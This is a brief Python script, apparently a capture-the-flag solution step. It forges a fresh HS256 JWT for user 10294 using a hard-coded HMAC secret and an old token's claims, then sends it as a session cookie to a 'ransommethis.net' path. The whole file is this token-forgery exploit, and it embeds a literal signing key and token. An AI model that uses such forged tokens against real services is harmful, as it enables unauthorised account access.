import hmac
import jwt
import requests
from datetime import datetime, timedelta

url = 'https://suvwwcedmdcyelgn.ransommethis.net/znejayfsvdnrzptm/'

old_claims = {
  "iat": 1653538754,
  "exp": 1656130754,
  "sec": "XQ8snyEw8ayiOXtkFapsnCikjDtll60V",
  "uid": 10294
}

now = datetime.now()
exp = now + timedelta(days=30)

claims = {
    'iat': now,
    'exp': exp,
    'sec': old_claims['sec'],
    'uid': old_claims['uid']
}

# return jwt.encode(claims, hmac_key(), algorithm='HS256')
# hmac_key(): returns "P9T43spRaRXrpB03PUpz7Wiv1d61qHqu"
hmac_key = "P9T43spRaRXrpB03PUpz7Wiv1d61qHqu"

token = jwt.encode(claims, key=hmac_key, algorithm='HS256')
# eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NjYzNzM1ODgsImV4cCI6MTY2ODk2NTU4OCwic2VjIjoiWFE4c255RXc4YXlpT1h0a0ZhcHNuQ2lrakR0bGw2MFYiLCJ1aWQiOjEwMjk0fQ.Ai97bcEVZ8J4zOYAdQkHTpYyeBQdqZ_ZU2SZkhmZOSY

s = requests.Session()
cookies = {'tok': token}
r = s.get(url, cookies=cookies)


